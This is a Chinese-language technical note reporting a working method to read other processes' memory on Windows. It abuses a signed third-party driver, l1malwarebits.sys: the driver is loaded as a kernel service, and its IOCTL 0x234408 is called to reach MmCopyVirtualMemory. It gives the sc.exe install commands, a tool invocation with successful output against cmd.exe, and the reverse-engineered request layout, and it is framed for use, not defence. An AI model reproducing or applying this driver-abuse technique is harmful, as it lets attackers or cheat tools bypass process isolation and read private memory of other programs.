# 不用 KKYUM：KPRL 直接进程读绕过 CR3 页

## 结论
已实现 **不使用 KKYUM** 的内存读取路径：

> KPRL `l1malwarebits.sys` IOCTL `0x234408`
> → `PsLookupProcessByProcessId`
> → `MmCopyVirtualMemory(target, src, current, dst, size)`

不依赖 KKYUM，也不依赖物理 CR3/页表页。

## 实测
目标 cmd.exe：
```
PID=11392
ImageBase=0x7FF7746F0000
```
命令：
```powershell
sc.exe create MembridgeKprlRead binPath= <path>\l1malwarebits.sys type= kernel start= demand
sc.exe start MembridgeKprlRead

layers.exe --kprl-read --pid 11392 --va 0x7FF7746F0000 --size 0x40
```
输出：
```
KPRL_READ PID=11392 VA=0x7FF7746F0000 size=0x40 HEX=
4D5A90000300000004000000FFFF0000
B8000000000000004000000000000000
...
VERDICT=PASS
```
返回的正是 cmd.exe 的 MZ/PE 头。

## 请求结构（逆向）
KPRL IOCTL `0x234408` 输入：
```
+0x08  u64 destination VA（当前进程缓冲区）
+0x10  u64 source VA（目标进程）
+0x18  u32 size
+0x20  u32 target PID
```
驱动内部：
```
PsLookupProcessByProcessId(pid, &proc)
MmCopyVirtualMemory(proc, src, IoGetCurrentProcess(), dst, size, ...)
```

## 与 KKYUM 对比
| 项目 | KKYUM | KPRL |
|---|---|---|
| 内核 VA 读取 | 支持 | 不需要 |
| 目标进程读 | 支持 | 支持 |
| 需要 CR3/页表 | 否 | 否 |
| 本机实测 | PASS | PASS |

## 限制
- 需要 KPRL 驱动可加载（当前签名 Valid、已实测）；
- 目标用户 VA 需要已知（PEB/ImageBase 或调用方提供）；
- 受保护/跨权限进程可能需要更高权限。
